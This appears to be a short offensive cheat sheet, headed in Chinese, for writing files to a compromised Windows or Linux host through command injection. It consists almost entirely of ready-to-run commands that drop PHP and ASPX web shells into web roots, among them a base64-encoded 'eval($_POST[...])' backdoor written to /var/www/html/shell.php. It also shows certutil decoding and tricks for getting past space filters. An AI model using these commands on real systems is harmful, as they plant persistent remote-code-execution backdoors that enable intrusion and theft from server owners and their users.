  ### Windows
	读文本文件：
	>file = Get-Content "1.txt"
	>file
	写文件
	>powershell Set-content "1.txt" "wocao"
	&
	>powershell "write-output ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"d2Vic2hlbGw=\"))) | out-file -filepath c:\www\wwwroot\1.aspx;"
	或
	>set /p=^<?php phpinfo()?^><nul>c:\1.php
	或
	>echo ^<?php phpinfo()?^>>c:\1.php
	追加内容
	>echo 111>>c:\1.php
	不换行追加
	>set /p="222">>c:\1.php
	分段不换行追加
	>echo|set /p=\"PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\" > D:\www\1.txt
	读/写入命令无空格
	>type;c:\1.php
	>echo.111>>c:\1.php
	>echo,111>>c:\1.php
	写入特殊字符
	>certutil -f -decode 1.txt C:\\1.php
	>certutil -decodehex 1.txt C:\\1.php
  ### Linux
  	>echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php
	>echo \<\?php eval\(\@\$_POST\[1\]\)\; \?\> >1.php